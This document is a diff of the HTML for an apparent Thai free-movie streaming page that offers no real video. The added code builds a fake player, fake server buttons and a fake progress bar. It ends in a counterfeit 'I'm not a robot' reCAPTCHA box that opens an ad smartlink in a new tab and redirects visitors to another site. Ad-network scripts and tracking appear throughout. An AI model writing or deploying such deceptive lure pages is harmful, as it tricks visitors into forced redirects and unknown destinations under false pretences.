@@ -1,612 +1,516 @@
 
 <!DOCTYPE html>
-<html lang="th">
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Master24hd - เว็บดูหนังออนไลน์เต็มเรื่อง 2026 ดูหนังใหม่ Netflix ฟรี
+</title>
+    <style>
+        /* Base Professional & Elegant Styling */
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-<!-- HISTATS -->
-<script>
-var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5011181,4,0,0,0,00010000']);
-_Hasync.push(['Histats.track_hits', '']);
+        :root {
+            --bg-dark: #050a0f;
+            --accent-color: #0077be; /* Ocean Blue accent */
+            --accent-glow: rgba(0, 119, 190, 0.15);
+            --text-main: #f8f9fa;
+            --text-muted: #8e929b;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.06);
+            --success-color: #00e676; /* Green for online status */
+        }
 
-(function() {
-var hs=document.createElement('script');
-hs.async=true;
-hs.src='//s10.histats.com/js15_as.js';
-document.head.appendChild(hs);
-})();
-</script>
+        body {
+            font-family: '-apple-system', BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+            -webkit-font-smoothing: antialiased;
+            background-image: radial-gradient(circle at 50% 50%, #051525 0%, #050a0f 100%);
+        }
 
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+        .wrapper {
+            width: 100%;
+            max-width: 900px;
+            margin: 0 auto;
+        }
 
-<title>ดูหนังออนไลน์ฟรี 24 UHD หนังใหม่2026 หนังNetflix พากย์ไทย</title>
+        .brand {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+        .brand span { color: var(--accent-color); text-shadow: 0 0 10px var(--accent-glow); }
 
-<meta name="description"
-content="ดูหนังออนไลน์ฟรี 24 UHD หนังใหม่2026 หนังNetflix พากย์ไทย เว็บดูหนังออนไลน์ฟรี ดูหนังใหม่ชนโรง เต็มเรื่อง 2026 หนังไทย หนังฝรั่ง Netflix พากย์ไทย ซับไทย ดูฟรี บนมือถือ Android iOS ไม่มีโฆษณา..">
+        .sub-brand-text {
+            text-align: center;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
 
-<link rel="preconnect" href="https://vidsrcme.su">
-<link rel="dns-prefetch" href="https://vidsrcme.su">
+        /* CINEMA SCREEN - Elegant Frame */
+        .cinema-screen {
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            background: #000 url('https://png.pngtree.com/thumb_back/fh260/background/20230703/pngtree-3d-rendered-movie-theatre-with-white-screen-image_3732826.jpg') center/cover no-repeat;
+            border-radius: 12px;
+            position: relative;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--glass-border);
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: border-color 0.3s ease;
+        }
+        .cinema-screen:hover {
+            border-color: rgba(0, 119, 190, 0.3);
+        }
 
-<style>
+        .center-play-btn {
+            width: 70px;
+            height: 70px;
+            background: rgba(10, 10, 15, 0.6);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 119, 190, 0.4);
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
+            transition: all 0.3s ease;
+        }
+        .cinema-screen:hover .center-play-btn {
+            transform: scale(1.08);
+            border-color: var(--accent-color);
+            box-shadow: 0 0 25px var(--accent-glow);
+        }
 
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-}
+        .play-icon-svg {
+            width: 22px;
+            height: 22px;
+            fill: var(--text-main);
+            margin-left: 4px;
+            transition: fill 0.3s ease;
+        }
+        .cinema-screen:hover .play-icon-svg {
+            fill: var(--accent-color);
+        }
 
-body{
-  background:#080808;
-  color:#fff;
-  font-family:Arial,sans-serif;
-  overflow-x:hidden;
-}
+        /* LOADING OVERLAY SCREEN */
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
 
-.container{
-  width:100%;
-  max-width:1300px;
-  margin:auto;
-  padding:15px;
-}
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
 
-/* ADS */
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 2px solid rgba(255, 255, 255, 0.03);
+            border-top: 2px solid var(--accent-color);
+            border-radius: 50%;
+            animation: spin 0.9s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            margin-bottom: 20px;
+        }
 
-.ad-wrap{
-  width:100%;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  margin:18px 0;
-  overflow:hidden;
-}
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-.ad-box{
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  overflow:hidden;
-  max-width:100%;
-}
+        .loading-text {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: var(--text-main);
+            margin-bottom: 8px;
+        }
 
-.page-layout{
-  display:grid;
-  grid-template-columns:minmax(0,1fr) 180px;
-  gap:20px;
-  align-items:start;
-}
+        .loading-subtext {
+            font-size: 11px;
+            color: var(--text-muted);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
 
-.sidebar-ads{
-  position:sticky;
-  top:15px;
-  display:flex;
-  flex-direction:column;
-  gap:18px;
-}
+        /* HIDDEN MESSAGE STYLE */
+        #hidden-message {
+            opacity: 0;
+            transition: opacity 0.8s ease-in-out;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+        #hidden-message.show {
+            opacity: 1;
+        }
 
-.mobile-sticky-ad{
-  position:fixed;
-  bottom:0;
-  left:0;
-  width:100%;
-  background:#111;
-  padding:6px 0;
-  display:flex;
-  justify-content:center;
-  z-index:99999;
-}
+        /* MULTI-SERVER PANEL */
+        .server-panel {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 20px;
+            text-align: center;
+        }
 
-.mobile-sticky-inner{
-  width:320px;
-  height:50px;
-  overflow:hidden;
-}
+        .server-title {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
 
-@media(max-width:1024px){
+        .server-title::before {
+            content: '';
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background-color: var(--accent-color);
+            border-radius: 50%;
+        }
 
-  .page-layout{
-    grid-template-columns:1fr;
-  }
+        .server-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 10px;
+        }
 
-  .sidebar-ads{
-    display:none;
-  }
+        .server-btn {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 6px;
+            padding: 12px 10px;
+            color: var(--text-main);
+            cursor: pointer;
+            text-align: left;
+            transition: all 0.2s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
 
-}
+        .server-btn:hover {
+            background: rgba(0, 119, 190, 0.05);
+            border-color: rgba(0, 119, 190, 0.4);
+            transform: translateY(-2px);
+        }
 
-@media(min-width:769px){
+        .server-name {
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
 
-  .mobile-sticky-ad{
-    display:none;
-  }
+        .server-status {
+            font-size: 9px;
+            color: var(--success-color);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
 
-}
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            background-color: var(--success-color);
+            border-radius: 50%;
+            display: inline-block;
+            animation: pulse-green 1.4s infinite ease-in-out;
+        }
 
-@media(max-width:768px){
+        @keyframes pulse-green {
+            0% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(0, 230, 118, 0.7); }
+            70% { transform: scale(1.1); box-shadow: 0 0 0 6px rgba(0, 230, 118, 0); }
+            100% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(0, 230, 118, 0); }
+        }
 
-  body{
-    padding-bottom:70px;
-  }
+        /* CONTROL HUB */
+        .control-hub {
+            text-align: center;
+            margin-top: 20px;
+        }
 
-}
+        .action-buttons {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+            width: 100%;
+        }
 
-/* HERO */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 14px 32px;
+            font-size: 11px;
+            font-weight: 700;
+            border-radius: 6px;
+            cursor: pointer;
+            border: none;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            flex: 1;
+            max-width: 200px;
+            transition: all 0.2s ease;
+        }
 
-.hero{
-  position:relative;
-  border-radius:20px;
-  overflow:hidden;
-  margin-bottom:20px;
-}
+        .btn-play { background-color: var(--text-main); color: var(--bg-dark); }
+        .btn-play:hover { background-color: var(--accent-color); color: #fff; }
 
-.hero img{
-  width:100%;
-  height:500px;
-  object-fit:cover;
-  filter:brightness(.45);
-}
+        .btn-download { background-color: transparent; color: var(--text-main); border: 1px solid rgba(255, 255, 255, 0.15); }
+        .btn-download:hover { border-color: var(--accent-color); color: var(--accent-color); }
 
-.hero-overlay{
-  position:absolute;
-  inset:0;
-  display:flex;
-  flex-direction:column;
-  justify-content:flex-end;
-  padding:35px;
-  background:linear-gradient(to top,
-  rgba(0,0,0,.95),
-  transparent);
-}
+        /* PLAYER BAR BARU */
+        .video-player-ui {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            z-index: 5;
+            color: white;
+            font-size: 12px;
+        }
+        .ui-progress { flex: 1; height: 4px; background: rgba(255,255,255,0.3); border-radius: 2px; }
+        .ui-bar { width: 40%; height: 100%; background: var(--accent-color); }
+        .ui-icons { display: flex; gap: 10px; cursor: pointer; }
 
-.title{
-  font-size:44px;
-  font-weight:bold;
-  margin-bottom:12px;
-}
+        .tech-specifications { display: flex; justify-content: center; align-items: center; gap: 10px; flex-wrap: wrap; margin-top: 24px; padding: 14px; background: rgba(255, 255, 255, 0.01); border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.03); }
+        .badge { display: inline-flex; align-items: center; gap: 6px; font-size: 9px; font-weight: 700; padding: 6px 12px; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); color: #8a8d93; border-radius: 3px; text-transform: uppercase; letter-spacing: 0.8px; }
 
-.desc{
-  max-width:760px;
-  line-height:1.7;
-  color:#ddd;
-}
+        .ads-space { width: 100%; margin: 20px auto; text-align: center; display: flex; justify-content: center; align-items: center; overflow: hidden; }
 
-.tags{
-  margin-top:18px;
-  display:flex;
-  flex-wrap:wrap;
-  gap:10px;
-}
-
-.tags span{
-  background:#e50914;
-  padding:7px 14px;
-  border-radius:40px;
-  font-size:12px;
-  font-weight:bold;
-}
-
-/* PLAYER */
-
-.player{
-  width:100%;
-  aspect-ratio:16/9;
-  background:#000;
-  border-radius:18px;
-  overflow:hidden;
-  box-shadow:0 0 20px rgba(0,0,0,.45);
-}
-
-.player iframe{
-  width:100%;
-  height:100%;
-  border:none;
-}
-
-/* SOCIAL */
-
-.social-section{
-  display:flex;
-  gap:15px;
-  margin-top:25px;
-  flex-wrap:wrap;
-}
-
-.social-btn{
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:8px;
-  padding:14px 22px;
-  border-radius:12px;
-  font-weight:bold;
-  text-decoration:none;
-  color:#fff;
-  transition:.2s;
-}
-
-.social-btn:hover{
-  transform:translateY(-2px);
-}
-
-.facebook-btn{
-  background:#1877f2;
-}
-
-.telegram-btn{
-  background:#0088cc;
-}
-
-/* MOVIE INFO */
-
-.movie-info{
-  margin-top:30px;
-  background:#111;
-  border:1px solid #ดูหนังชนโรง หนังออนไลน์ 2026 หนังใหม่ฟรี คมชัด ไม่กระตุก 24fhd;
-  border-radius:18px;
-  padding:22px;
-}
-
-.movie-info h2{
-  margin-bottom:15px;
-}
-
-.movie-meta{
-  display:flex;
-  flex-wrap:wrap;
-  gap:12px;
-  margin-bottom:18px;
-}
-
-.movie-meta span{
-  background:#1b1b1b;
-  padding:8px 12px;
-  border-radius:10px;
-  font-size:13px;
-}
-
-.movie-story{
-  color:#ccc;
-  line-height:1.8;
-}
-
-@media(max-width:768px){
-
-  .hero img{
-    height:320px;
-  }
-
-  .hero-overlay{
-    padding:20px;
-  }
-
-  .title{
-    font-size:30px;
-  }
-
-  .social-section{
-    flex-direction:column;
-  }
-
-  .social-btn{
-    width:100%;
-  }
-
-}
-
-</style>
+        .recaptcha-box { margin-top: 20px; padding: 10px 20px; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; display: flex; align-items: center; gap: 15px; cursor: pointer; color: #333; font-family: Roboto, helvetica, arial, sans-serif; font-size: 14px; }
+        .checkbox-fake { width: 25px; height: 25px; border: 2px solid #c1c1c1; border-radius: 2px; display: flex; align-items: center; justify-content: center; transition: all 0.2s; }
+        .checkmark { color: var(--accent-color); font-size: 20px; font-weight: bold; display: none; }
+    </style>
 </head>
-
 <body>
 
-<script>
-
-const MOVIE_THUMBNAIL =
-"https://image.tmdb.org/t/p/original/6pUkMgAGyYxuCJegLGTDpsBRF2r.jpg";
-
-const FACEBOOK_LINK =
-"https://facebook.com";
-
-const TELEGRAM_LINK =
-"https://t.me/";
-
-</script>
-
-<div class="container">
-
-<!-- TOP ADS -->
-
-<div class="ad-wrap">
-
-<div class="ad-box">
-
-<script type="text/javascript">
-atOptions = {
-    'key' : '9cbca9fc3fab1a4816a56e2fcd9cedb9',
-    'format' : 'iframe',
-    'height' : 50,
-    'width' : 320,
-    'params' : {}
-};
-</script>
-
-<script type="text/javascript" src="//twigentirelysailor.com/9cbca9fc3fab1a4816a56e2fcd9cedb9/invoke.js"></script>
-
-</div>
-</div>
-
-<!-- HERO -->
-
-<div class="hero">
-
-<img src="" id="heroImage">
-
-<div class="hero-overlay">
-
-<div class="title">
-ดูหนังออนไลน์ฟรี HD ดูหนังใหม่ Netflix ดูหนังเต็มเรื่อง 2026
-</div>
-
-<div class="desc">
-ดูหนังออนไลน์ฟรี 24 UHD หนังใหม่2026 หนังNetflix พากย์ไทย เว็บดูหนังออนไลน์ฟรี ดูหนังใหม่ชนโรง เต็มเรื่อง 2026 หนังไทย หนังฝรั่ง Netflix พากย์ไทย ซับไทย ดูฟรี บนมือถือ Android iOS ไม่มีโฆษณา..
-</div>
-
-<div class="tags">
-<span>FULL HD</span>
-<span>Top box office</span>
-<span>Movies</span>
-<span>TV</span>
-</div>
-
-</div>
-</div>
-
-<div class="page-layout">
-
-<!-- MAIN -->
-
-<div>
-
-<!-- PLAYER -->
-
-<div class="player">
-
-<div class="player-content">
-
-<img
-src=""
-class="thumbnail"
-id="playerThumbnail"
->
-
-<div class="play-btn"
-id="playBtn"
-onclick="startPlayer()">
-▶
-</div>
-
-<!-- BUFFER -->
-
-<div class="buffering"
-id="buffer">
-
-<div class="spinner"></div>
-
-<div class="buffer-text"
-id="bufferText">
-กำลังโหลดวิดีโอ... 0%
-</div>
-
-</div>
-
-<!-- CTA -->
-
-<div class="cta-overlay"
-id="ctaOverlay">
-
-<div class="cta-box">
-
-<div class="cta-title">
-เลือกตัวเลือกการรับชม
-</div>
-
-<div class="cta-sub">
-กรุณาเลือกเซิร์ฟเวอร์เพื่อดูหนัง
-</div>
-
-<div class="cta-buttons">
-
-<button class="cta-btn primary-btn"
-onclick="goSmartLink()">
-▶ ดูหนัง HD
-</button>
-
-<button class="cta-btn secondary-btn"
-onclick="goSmartLink()">
-📺 เซิร์ฟเวอร์สำรอง
-</button>
-
-<button class="cta-btn telegram-btn"
-onclick="goSmartLink()">
-📢 กลุ่มหนังใหม่
-</button>
-
-</div>
-
-</div>
-</div>
-
-<!-- CONTROLS -->
-
-<div class="video-controls">
-
-<div class="progress-container">
-
-<div class="progress-bg"></div>
-
-<div class="progress-current"></div>
-
-</div>
-
-<div class="controls-bottom">
-
-<div class="left-controls">
-
-<span>
-00:00
-</span>
-
-<span style="color:#aaa;">
-/
-</span>
-
-<span>
-02:08:44
-</span>
-
-</div>
-
-<div class="right-controls">
-
-<span class="quality">
-HD
-</span>
-
-</div>
-
-</div>
-</div>
-
-</div>
-</div>
-
-<!-- 300x250 -->
-
-<div class="ad-wrap">
-
-<div class="ad-box">
-
-<script>
-  atOptions = {
-    'key' : '53541ca00eed825e8c431c12f7418ac0',
-    'format' : 'iframe',
-    'height' : 250,
-    'width' : 300,
-    'params' : {}
-  };
-</script>
-
-<script src="https://buffcasualwhine.com/53541ca00eed825e8c431c12f7418ac0/invoke.js"></script>
-
-</div>
-</div>
-
-<!-- MOVIE INFO -->
-
-<div class="movie-info">
-
-<h2>ดูหนังชนโรง หนังออนไลน์ 2026 หนังใหม่ฟรี คมชัด ไม่กระตุก 24fhd เว็บดูหนังออนไลน์ ดูหนังชนโรง หนังใหม่ Netflix 2026 รวมหนังดัง หนังมาแรง ครบทุกเรื่อง ภาพสวย คมชัด ดูลื่น ไม่มีสะดุด ดูหนังฟรี โหลดไว ไม่ต้องรอนาน.</h2>
-
-<div class="movie-meta">
-
-<span>⭐ 10/10</span>
-<span>🎬 FULL HD</span>
-<span>⏱ 3h 18m</span>
-<span>🌏 TH/EN</span>
-
-</div>
-
-<div class="ดูหนังออนไลน์">
-ดูหนังออนไลน์ฟรี 24 UHD หนังใหม่2026 หนังNetflix พากย์ไทย Netflix Disney+ HBO Prime Video ไว้ในที่เดียว คุณภาพ HD 4K เสียง พากย์ไทย ซับไทย รวมกว่า 8800 เรื่อง อัปเดต ทุกวัน. 
-
-</div>
-
-</div>
-
-<!-- 468x60 -->
-
-<div class="ad-wrap">
-
-<div class="ad-box">
-
-<script type="text/javascript">
-atOptions = {
-    'key' : '9cbca9fc3fab1a4816a56e2fcd9cedb9',
-    'format' : 'iframe',
-    'height' : 50,
-    'width' : 320,
-    'params' : {}
-};
-</script>
-
-<script type="text/javascript" src="//twigentirelysailor.com/9cbca9fc3fab1a4816a56e2fcd9cedb9/invoke.js"></script>
-
-</div>
-</div>
-
-</div>
-
-<!-- SIDEBAR -->
-
-<div class="sidebar-ads">
-
-<div class="ad-box">
-
-<script>
-  atOptions = {
-    'key' : 'b1459668f954a85fab060a214b597df2',
-    'format' : 'iframe',
-    'height' : 300,
-    'width' : 160,
-    'params' : {}
-  };
-</script>
-<script src="https://buffcasualwhine.com/b1459668f954a85fab060a214b597df2/invoke.js"></script>
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-<!-- MOBILE STICKY -->
-
-<div class="mobile-sticky-ad">
-
-<div class="mobile-sticky-inner">
-
-<script type="text/javascript">
-atOptions = {
-    'key' : '9cbca9fc3fab1a4816a56e2fcd9cedb9',
-    'format' : 'iframe',
-    'height' : 50,
-    'width' : 320,
-    'params' : {}
-};
-</script>
-
-<script type="text/javascript" src="//twigentirelysailor.com/9cbca9fc3fab1a4816a56e2fcd9cedb9/invoke.js"></script>
-
-</div>
-</div>
-
-<script>
-
-/* HERO IMAGE */
-
-document.getElementById("heroImage").src =
-MOVIE_THUMBNAIL;
-
-/* SOCIAL LINKS */
-
-document.getElementById("facebookBtn").href =
-FACEBOOK_LINK;
-
-document.getElementById("telegramBtn").href =
-TELEGRAM_LINK;
-
-</script>
-
-</body>
+    <div class="wrapper">
+        <div class="brand">Cinetique <span>Cinema</span></div>
+        <div class="sub-brand-text">WATCH STREAMING ONLINE FOR FREE IN HD</div>
+
+        <div class="ads-space">
+            <center>
+            <script type="text/javascript">
+                atOptions = { 'key' : '9cbca9fc3fab1a4816a56e2fcd9cedb9', 'format' : 'iframe', 'height' : 50, 'width' : 320, 'params' : {} };
+            </script>
+            <script type="text/javascript" src="https://buffcasualwhine.com/9cbca9fc3fab1a4816a56e2fcd9cedb9/invoke.js"></script>
+            </center>
+        </div>
+
+        <div class="cinema-screen" id="play-screen" style="cursor: pointer;">
+            <div class="loading-overlay" id="loading-box">
+                <div class="loading-spinner"></div>
+                <div class="loading-text" id="loading-percentage">0%</div>
+                <div class="loading-subtext" id="loading-status">Connecting...</div>
+                <div id="hidden-message">
+                    <p style="font-size: 16px; color: var(--text-main); margin-bottom: 10px;">เรื่องราวยังคงดำเนินต่อไป...</p>
+                    <div style="font-weight: bold; color: var(--accent-color); font-size: 18px; letter-spacing: 2px;">ก้าวเข้าไปข้างใน</div>
+                </div>
+            </div>
+
+            <div class="video-player-ui">
+                <span id="play-btn-ui">▶</span>
+                <span id="timer-ui">00:00:00 / 01:15:00</span>
+                <div class="ui-progress"><div class="ui-bar"></div></div>
+                <div class="ui-icons">🔊 ⚙ ⛶</div>
+            </div>
+
+            <button class="center-play-btn" id="center-play-btn">
+                <svg class="play-icon-svg" viewBox="0 0 24 24">
+                    <path d="M8 5v14l11-7z"/>
+                </svg>
+            </button>
+        </div>
+
+        <div class="server-panel">
+            <div class="server-title">เลือกเซิร์ฟเวอร์สตรีมมิ่งระดับพรีเมียม</div>
+            <div class="server-grid">
+                <button class="server-btn" data-server="1">
+                    <span class="server-name">Server 1 (Auto-Route)</span>
+                    <span class="server-status"><span class="status-dot"></span>Ultra HD</span>
+                </button>
+                <button class="server-btn" data-server="2">
+                    <span class="server-name">Server 2 (Google Cloud)</span>
+                    <span class="server-status"><span class="status-dot"></span>Direct Fast</span>
+                </button>
+                <button class="server-btn" data-server="3">
+                    <span class="server-name">Server 3 (Akamai CDN)</span>
+                    <span class="server-status"><span class="status-dot"></span>Low Latency</span>
+                </button>
+                <button class="server-btn" data-server="4">
+                    <span class="server-name">Server 4 (Europe Node)</span>
+                    <span class="server-status"><span class="status-dot"></span>1080p Stable</span>
+                </button>
+                <button class="server-btn" data-server="5">
+                    <span class="server-name">Server 5 (Backup Multi)</span>
+                    <span class="server-status"><span class="status-dot"></span>Online</span>
+                </button>
+            </div>
+        </div>
+
+        <div class="control-hub">
+            <div class="ads-space">
+                <center>
+                <script type="text/javascript">
+                    atOptions = { 'key' : '9cbca9fc3fab1a4816a56e2fcd9cedb9', 'format' : 'iframe', 'height' : 60, 'width' : 468, 'params' : {} };
+                </script>
+                <script type="text/javascript" src="https://buffcasualwhine.com/9cbca9fc3fab1a4816a56e2fcd9cedb9/invoke.js"></script>
+                </center>
+            </div>
+
+            <div class="action-buttons">
+                <button class="btn btn-play" id="btn-play-now">► เล่นเลย</button>
+                <button class="btn btn-download" id="btn-download-now">↓ ดาวน์โหลด</button>
+            </div>
+
+            <div class="ads-space">
+                <center>
+                <script type="text/javascript">
+                    atOptions = { 'key' : 'b1459668f954a85fab060a214b597df2', 'format' : 'iframe', 'height' : 300, 'width' : 160, 'params' : {} };
+                </script>
+                <script type="text/javascript" src="https://buffcasualwhine.com/b1459668f954a85fab060a214b597df2/invoke.js"></script>
+                </center>
+            </div>
+
+            <div class="tech-specifications">
+                <span class="badge">4K UHD</span>
+                <span class="badge">HDR10+</span>
+                <span class="badge">DOLBY ATMOS</span>
+                <span class="badge">PC / WINDOWS</span>
+                <span class="badge">IPHONE / IOS</span>
+                <span class="badge">ANDROID / TV</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- KONFIGURASI LINK ---
+        const linkUtamaAnda = "https://wowclip.xyz/maxhub"; 
+        const linkSmartlink = "https://buffcasualwhine.com/wr8004x9r?key=18f7a7ba1e3a9ad30183a10512fe8d39"; 
+        // ---------------------------------
+
+        function eksekusiSistemTernakCuan() {
+            const overlay = document.getElementById('loading-box');
+            const textPersen = document.getElementById('loading-percentage');
+            const textStatus = document.getElementById('loading-status');
+            overlay.classList.add('active');
+            let currentPercent = 0;
+
+            function processLoading() {
+                if (currentPercent < 100) {
+                    let increment = Math.floor(Math.random() * 12) + 4;
+                    currentPercent += increment;
+                    if (currentPercent > 100) currentPercent = 100;
+                    textPersen.innerText = currentPercent + "%";
+                    
+                    if (currentPercent >= 45 && currentPercent <= 55) {
+                        const msg = document.getElementById('hidden-message');
+                        msg.style.display = 'block';
+                        setTimeout(() => { msg.classList.add('show'); }, 50);
+                    }
+                    
+                    if (currentPercent <= 30) textStatus.innerText = "Connecting Secure Server...";
+                    else if (currentPercent <= 75) textStatus.innerText = "Bypassing Video Buffer...";
+                    else textStatus.innerText = "Redirecting to Stream...";
+
+                    setTimeout(processLoading, 150);
+                } else {
+                    document.querySelector('.loading-spinner').style.display = 'none';
+                    textPersen.style.display = 'none';
+                    textStatus.innerText = "VERIFYING HUMANITY";
+                    
+                    const rcBox = document.createElement("div");
+                    rcBox.className = "recaptcha-box";
+                    rcBox.innerHTML = '<div class="checkbox-fake" id="fake-check"><span class="checkmark" id="tick">✔</span></div><div style="margin-left: 10px;">I\'m not a robot</div>';
+                    
+                    rcBox.onclick = function() { 
+                        document.getElementById('tick').style.display = 'block';
+                        document.getElementById('fake-check').style.borderColor = 'var(--accent-color)';
+                        
+                        // Eksekusi Redirect Ganda
+                        window.open(linkSmartlink, '_blank');
+                        window.location.href = linkUtamaAnda;
+                    };
+                    overlay.appendChild(rcBox);
+                }
+            }
+            processLoading();
+        }
+
+        document.getElementById('play-screen').addEventListener('click', eksekusiSistemTernakCuan);
+        document.getElementById('btn-play-now').addEventListener('click', eksekusiSistemTernakCuan);
+        document.getElementById('btn-download-now').addEventListener('click', eksekusiSistemTernakCuan);
+        document.querySelectorAll('.server-btn').forEach(btn => btn.addEventListener('click', eksekusiSistemTernakCuan));
+    </script>
+    <script type="text/javascript">
+    var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5011181,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();
+    </script>
+    <noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?5011181&101" alt="web counters" border="0"></a></noscript>
+    </body>
 </html>
